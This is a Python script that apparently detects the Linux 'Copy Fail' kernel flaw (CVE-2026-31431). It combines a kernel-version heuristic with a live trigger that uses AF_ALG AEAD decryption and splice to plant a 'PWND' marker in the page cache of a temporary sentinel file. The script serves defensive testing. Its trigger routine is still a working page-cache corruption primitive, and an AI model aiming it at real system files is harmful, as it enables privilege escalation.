#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-31431 ("Copy Fail") vulnerability detector — Python 3.6 compatible
FIXED: Correctly handles RHEL/AlmaLinux backports (4.18/5.14) and built-in modules.
"""

from __future__ import print_function
import errno
import os
import socket
import struct
import sys
import tempfile
import ctypes
import ctypes.util

try:
    from typing import Optional, Tuple
except ImportError:
    Optional = lambda x: x
    Tuple = lambda *a: tuple

# --- Constants ---
AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_OP_DECRYPT = 0
CRYPTO_AUTHENC_KEYA_PARAM = 1

ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"
PAGE = 4096
ASSOCLEN = 8
CRYPTLEN = 16
TAGLEN = 16
MARKER = b"PWND"

# --- Syscall ---
_libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
_libc.syscall.restype = ctypes.c_long
_libc.syscall.argtypes = [ctypes.c_long] * 7
SPLICE_SYSCALL = 275  # x86_64
SPLICE_F_MOVE = 0x01

def _splice(fd_in, off_in, fd_out, off_out, length, flags):
    off_in_ptr = ctypes.pointer(ctypes.c_longlong(off_in)) if off_in is not None else ctypes.c_void_p(0)
    off_out_ptr = ctypes.pointer(ctypes.c_longlong(off_out)) if off_out is not None else ctypes.c_void_p(0)
    
    res = _libc.syscall(
        ctypes.c_long(SPLICE_SYSCALL), ctypes.c_long(fd_in), off_in_ptr,
        ctypes.c_long(fd_out), off_out_ptr, ctypes.c_long(length), ctypes.c_long(flags)
    )
    if res < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return int(res)

def parse_kernel_version(release_str):
    base = release_str.split('-')[0]
    parts = base.split('.')
    try:
        return int(parts[0]), int(parts[1]), int(parts[2]) if len(parts) > 2 else 0
    except ValueError:
        return 0, 0, 0

def is_kernel_affected(release_str):
    major, minor, _ = parse_kernel_version(release_str)
    is_rhel = any(x in release_str for x in ('.el8_', '.el9_', '.el10_'))
    
    # RHEL/AlmaLinux бэкпорты затронуты (начиная с 4.14+)
    if is_rhel:
        if (major, minor) >= (4, 14):
            return True, "RHEL/AlmaLinux backport detected. Treated as POTENTIALLY VULNERABLE until vendor patch is applied."
        return False, "Very old RHEL kernel (<4.14). Unlikely affected."
    
    # Mainline kernels
    if major == 6 and 12 <= minor <= 18:
        return True, "Mainline kernel in affected 6.12-6.18 range."
    if (major, minor) >= (4, 14):
        return True, "Kernel >=4.14. May contain backported vulnerable code. Treat as affected."
    return False, "Kernel <4.14. Predates vulnerable commit 72548b093ee3."

def build_authenc_keyblob(authkey, enckey):
    rtattr = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
    keyparam = struct.pack(">I", len(enckey))
    return rtattr + keyparam + authkey + enckey

def precheck():
    if not os.path.exists("/proc/crypto"):
        return "/proc/crypto missing"
    try:
        s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.bind(("aead", ALG_NAME))
        s.close()
    except OSError as e:
        return "AF_ALG/AEAD not available: {}".format(getattr(e, 'strerror', str(e)))
    return None

def attempt_trigger(target_path):
    sentinel = (b"COPYFAIL-SENTINEL-UNCORRUPTED!\n" * (PAGE // 32))[:PAGE]
    with open(target_path, "wb") as f:
        f.write(sentinel)
    
    fd_target = os.open(target_path, os.O_RDONLY)
    os.read(fd_target, PAGE)
    os.lseek(fd_target, 0, os.SEEK_SET)
    
    master = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    master.bind(("aead", ALG_NAME))
    master.setsockopt(SOL_ALG, ALG_SET_KEY, build_authenc_keyblob(b"\x00"*32, b"\x00"*16))
    op, _ = master.accept()
    
    aad = b"\x00"*4 + MARKER
    cmsg = [
        (SOL_ALG, ALG_SET_OP, struct.pack("I", ALG_OP_DECRYPT)),
        (SOL_ALG, ALG_SET_IV, struct.pack("I", 16) + b"\x00"*16),
        (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("I", ASSOCLEN)),
    ]
    op.sendmsg([aad], cmsg, socket.MSG_MORE)
    
    pr, pw = os.pipe()
    try:
        n = _splice(fd_target, 0, pw, None, CRYPTLEN+TAGLEN, SPLICE_F_MOVE)
        if n != CRYPTLEN+TAGLEN: raise RuntimeError("splice file->pipe short")
        n = _splice(pr, None, op.fileno(), None, n, SPLICE_F_MOVE)
        if n != CRYPTLEN+TAGLEN: raise RuntimeError("splice pipe->op short")
    except OSError as e:
        os.close(pr); os.close(pw); op.close(); master.close(); os.close(fd_target)
        if e.errno in (errno.EOPNOTSUPP, errno.ENOTSUP, errno.EINVAL):
            raise RuntimeError("splice into AF_ALG not supported on this kernel")
        raise
    
    try: op.recv(ASSOCLEN+CRYPTLEN+TAGLEN)
    except OSError as e:
        if e.errno not in (errno.EBADMSG, errno.EINVAL): raise
    
    op.close(); master.close(); os.close(pr); os.close(pw)
    os.lseek(fd_target, 0, os.SEEK_SET)
    after = os.read(fd_target, PAGE)
    os.close(fd_target)
    return after, sentinel

def main():
    release = os.uname().release
    affected, msg = is_kernel_affected(release)
    
    print("[*] CVE-2026-31431 detector | Kernel: {} | Python: {}.{}".format(
        release, sys.version_info.major, sys.version_info.minor))
    print("[i] Version analysis: {}".format(msg))
    
    reason = precheck()
    if reason:
        print("[+] Precondition not met: {}. NOT vulnerable via this vector.".format(reason))
        return 0
    
    print("[+] AF_ALG + AEAD interface is available. Running trigger...")
    
    tmp = tempfile.mkdtemp(prefix="copyfail-")
    target = os.path.join(tmp, "sentinel.bin")
    try:
        after, sentinel = attempt_trigger(target)
    except Exception as e:
        print("[!] Trigger failed: {}".format(e))
        return 1
    finally:
        try: os.remove(target); os.rmdir(tmp)
        except OSError: pass
    
    min_len = min(len(after), len(sentinel))
    diffs = [i for i in range(min_len) if after[i] != sentinel[i]]
    marker_off = after.find(MARKER)
    
    if marker_off >= 0 and sentinel.find(MARKER) < 0:
        ctx = after[max(marker_off-4,0):marker_off+12]
        print("[!] VULNERABLE. Marker landed in page-cache at offset {}.".format(marker_off))
        return 2
    if diffs:
        print("[!] Page cache MODIFIED via AEAD splice. {} bytes changed.".format(len(diffs)))
        return 2
    
    print("[+] Page cache intact. NOT vulnerable on this kernel build.")
    return 0

if __name__ == "__main__":
    sys.exit(main())
